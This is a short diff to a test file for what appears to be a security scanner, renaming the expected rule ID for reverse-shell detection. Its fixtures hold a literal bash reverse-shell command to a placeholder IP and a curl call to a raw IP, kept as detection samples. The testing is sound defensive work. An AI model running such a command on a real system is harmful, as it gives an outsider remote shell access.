@@ -55,7 +55,7 @@ class TestRuleMatching:
         fp = tmp_file("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
         findings = scan_file(fp)
         ids = {f.rule_id for f in findings}
-        assert "HIGH_REVERSE_SHELL" in ids
+        assert "CRIT_REVERSE_SHELL" in ids
 
     def test_raw_ip_outbound(self, tmp_file):
         fp = tmp_file("curl http://192.168.1.1:8080/data")
